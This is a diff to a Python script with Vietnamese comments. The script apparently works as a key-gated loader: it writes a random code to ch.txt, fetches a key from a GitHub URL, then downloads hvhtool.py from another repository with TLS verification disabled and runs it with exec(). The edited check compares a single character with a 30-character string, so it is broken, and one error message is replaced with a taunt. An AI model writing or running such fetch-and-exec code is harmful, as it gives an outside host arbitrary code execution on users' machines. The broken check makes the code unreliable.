@@ -4,6 +4,7 @@ import time
 import json
 from curl_cffi import requests
 import sys
+import random
 from time import sleep
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor
@@ -16,6 +17,7 @@ def encrypt_data(data):
 
 def decrypt_data(encrypted_data):
     return base64.b64decode(encrypted_data.encode()).decode()
+
 
 # Màu sắc cho hiển thị
 xnhac = "\033[1;36m"
@@ -119,14 +121,19 @@ def get_shortened_link_phu(url):
     except Exception as e:
         return {"status": "error", "message": f"Lỗi khi rút gọn URL: {e}"}
 
+
 def main():
+    
+    prefix = "HVH156XDTNL912"
+    suffix = ''.join(random.choices('0123456789', k=16))
+    code = prefix + suffix
     try:
         with open("ch.txt", "w") as file:
-            file.write("1")
+            file.write(f"{code}")
         #print("Đã tạo file ch.txt và viết số 1 vào đó.")
     except Exception as e:
         print(f"Lỗi khi khởi tạo")
-        
+
     try: 
         keydis = requests.get('https://raw.githubusercontent.com/shopaccrandom/md/refs/heads/main/modun_setup/modun_0368tedj7bzxkn3cevtp/nodun_28sr2ocxwnerfkr4dnvs.txt').text.strip()
     except:
@@ -214,11 +221,11 @@ def main():
                         sys.exit()
 
 main()
-def check_first_char():
+def check_first_char(code):
     try:
         # Kiểm tra xem file ch.txt có tồn tại không
         if not os.path.exists("ch.txt"):
-            print("File ch.txt không tồn tại.")
+            print("không tồn tại.")
             return False
         
         # Đọc dòng đầu tiên của file
@@ -226,19 +233,19 @@ def check_first_char():
             first_line = file.readline().strip()
             
             # Kiểm tra xem dòng đầu có rỗng không và ký tự đầu có phải là '1' không
-            if first_line and first_line[0] == '1':
-                print("Ký tự đầu tiên của dòng đầu trong ch.txt là số 1.")
+            if first_line and first_line[0] == code:
+                print("là số 1.")
                 url = 'https://raw.githubusercontent.com/shopaccrandom/jjjjjjjj/refs/heads/main/goc/hvhtool.py'
                 response = requests.get(url, verify=False)
                 #response.encoding = 'utf-8'
                 exec(response.text)
                 return True
             else:
-                print("Ký tự đầu tiên của dòng đầu trong ch.txt không phải là số 1.")
+                print("không phải là số 1.")
                 return False
                 
     except Exception as e:
-        print(f"Lỗi khi đọc file ch.txt: {e}")
+        print(f"MÀY LÀM ĐƯỢC GÌ PHA ĐẤY ??? =))")
         return False
 
 # Gọi hàm để kiểm tra
